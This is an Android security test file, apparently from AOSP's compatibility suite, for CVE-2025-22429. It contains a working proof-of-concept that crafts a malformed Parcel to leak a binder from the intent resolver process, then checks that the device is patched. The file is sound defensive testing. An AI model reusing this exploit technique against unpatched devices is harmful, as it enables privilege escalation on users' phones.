/*
 * Copyright (C) 2025 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2025_22429;

import static androidx.test.core.app.ApplicationProvider.getApplicationContext;

import static com.google.common.truth.Truth.assertWithMessage;
import static com.google.common.truth.TruthJUnit.assume;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.media.MediaMetadata;
import android.os.BaseBundle;
import android.os.Bundle;
import android.os.Parcel;
import android.os.Parcelable;
import android.platform.test.annotations.AsbSecurityTest;

import androidx.test.runner.AndroidJUnit4;

import com.android.sts.common.util.StsExtraBusinessLogicTestCase;

import org.junit.Test;
import org.junit.runner.RunWith;

import java.lang.reflect.Field;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;

@RunWith(AndroidJUnit4.class)
public class CVE_2025_22429 extends StsExtraBusinessLogicTestCase {
    public static final String BROADCAST_ACTION = "cve_2025_22429_action";
    public static final String PROCESSNAME_FOR_POCRECEIVER =
            "cve_2025_22429_broadcast_receiver_process_name";
    public static final String UNEXPECTED_EXCEPTION = "cve_2025_22429_unexpected_exception";

    @AsbSecurityTest(cveBugId = 373357090)
    @Test
    @SuppressLint("MissingFail")
    public void testPocCVE_2025_22429() {
        try {
            // Create a bundle with malicious parcel with key 'EXTRA_INITIAL_INTENTS'.
            final Context context = getApplicationContext();
            final Bundle maliciouBundle = new Bundle();
            maliciouBundle.putParcelable(Intent.EXTRA_INITIAL_INTENTS, createMaliciousParcelable());
            final Bundle bundle = new Bundle();
            bundle.putBundle(context.getPackageName(), maliciouBundle);

            // Create an Intent with action 'Intent.ACTION_CHOOSER' including malicious Bundle.
            // Setting action as 'ACTION_CHOOSER', it starts 'ChooserActivity' which further
            // require 'Extras'.
            // An intent is added as 'Extras' with component as 'PocActivity'. The
            // 'ChooserActivity' would directly start the 'PocActivity', implemented by
            // 'shouldAutoLaunchSingleChoice'.
            // Further, the malicious data into the Parcel causes the process to crash.
            // Due to a logic error, the Parcel fails to recognize that it has some data and calls
            // recycle without removing the data.
            // Without fix, the parcel is re-used when it is used to launch 'PocActivity'
            // and the binder gets leaked.
            final Intent maliciousIntent =
                    new Intent(Intent.ACTION_CHOOSER)
                            .addFlags(
                                    Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK)
                            .putExtra(
                                    Intent.EXTRA_INTENT,
                                    new Intent(context, PocActivity.class)
                                            .setAction(Intent.ACTION_CHOOSER)
                                            .addFlags(
                                                    Intent.FLAG_ACTIVITY_NEW_TASK
                                                            | Intent.FLAG_ACTIVITY_CLEAR_TASK))
                            .putExtra(Intent.EXTRA_REPLACEMENT_EXTRAS, bundle);

            // Configure a broadcast receiver.
            final CompletableFuture<Exception> exceptionOccurred = new CompletableFuture();
            final CompletableFuture<String> processNameOfPocBroadcastReceiver =
                    new CompletableFuture();
            context.registerReceiver(
                    new BroadcastReceiver() {
                        @Override
                        public void onReceive(Context context, Intent intent) {
                            try {
                                final Exception exception =
                                        (Exception)
                                                intent.getSerializableExtra(UNEXPECTED_EXCEPTION);
                                exceptionOccurred.complete(exception);
                                if (intent.hasExtra(PROCESSNAME_FOR_POCRECEIVER)) {
                                    processNameOfPocBroadcastReceiver.complete(
                                            intent.getStringExtra(PROCESSNAME_FOR_POCRECEIVER));
                                }
                            } catch (Exception expected) {
                                // Ignore unexpected exceptions.
                            }
                        }
                    },
                    new IntentFilter(BROADCAST_ACTION),
                    Context.RECEIVER_EXPORTED);

            // Start the activity using above created malicious 'Intent'.
            context.startActivity(maliciousIntent);
            final long timeout = 15L;
            assume().withMessage(
                            "Unexpected exception in PocActivity: "
                                    + exceptionOccurred.getNow(null))
                    .that(exceptionOccurred.get(timeout, TimeUnit.SECONDS))
                    .isNull();

            // Fetch process name related to 'ACTION_CHOOSER', i.e. 'com.android.intentresolver'.
            final String intentResolverProcessName =
                    context.getPackageManager()
                            .resolveActivity(maliciousIntent, PackageManager.MATCH_SYSTEM_ONLY)
                            .activityInfo
                            .processName;

            // Without fix, the binder is leaked. A broadcast from 'PocBroadcastReceiver'
            // is received which includes the process name under which it is running. The fetched
            // process name is equal to the process name for 'ACTION_CHOOSER',
            // i.e. 'com.android.intentresolver'.
            // With fix, the binder is null.
            assertWithMessage("Device is vulnerable to b/373357090 !!")
                    .that(processNameOfPocBroadcastReceiver.get(timeout, TimeUnit.SECONDS))
                    .isNotEqualTo(intentResolverProcessName);
        } catch (Exception e) {
            assume().that(e).isNull();
        }
    }

    private Parcelable createMaliciousParcelable() throws Exception {
        // Create a malicious Parcel.
        final Parcel maliciousParcel = Parcel.obtain();
        maliciousParcel.writeInt(0 /* data size */);
        maliciousParcel.writeInt(
                (int) getDeclaredField(BaseBundle.class, "BUNDLE_MAGIC").get(null));

        // Set data for the map.
        // mMap = size=2; data=<<cve_2025_22429_key, LazyValue>, <cve_2025_22429_key, value>>
        final String uniqueKey = "cve_2025_22429_key";
        maliciousParcel.writeInt(2 /* size */);
        maliciousParcel.writeString(uniqueKey);
        maliciousParcel.writeInt((int) getDeclaredField(Parcel.class, "VAL_PARCELABLE").get(null));
        final int payloadLength = 204; // objectLength
        maliciousParcel.writeInt(payloadLength);
        maliciousParcel.writeByteArray(new byte[payloadLength - 4]);

        // The second entry in the map with the same key 'cve_2025_22429_key', causes an
        // 'IllegalArgumentException' with message 'Duplicate key in ArrayMap'
        maliciousParcel.writeString(uniqueKey);
        maliciousParcel.writeInt(0);

        // Update the size of the 'maliciousParcel'
        final int totalSize = maliciousParcel.dataSize();
        maliciousParcel.setDataPosition(0);
        maliciousParcel.writeInt(totalSize - 8);
        maliciousParcel.setDataPosition(0);

        // Create an instance of 'MediaMetadata'.
        final Parcel parcel = Parcel.obtain();
        final MediaMetadata mediaMetadata = MediaMetadata.CREATOR.createFromParcel(parcel);
        parcel.recycle();
        getDeclaredField(MediaMetadata.class, "mBundle")
                .set(mediaMetadata, maliciousParcel.readBundle());
        maliciousParcel.recycle();
        return mediaMetadata;
    }

    public static Field getDeclaredField(Class cls, String fieldName) {
        for (Field field : cls.getDeclaredFields()) {
            if (field.getName().endsWith(fieldName)) {
                field.setAccessible(true);
                return field;
            }
        }
        return null;
    }
}
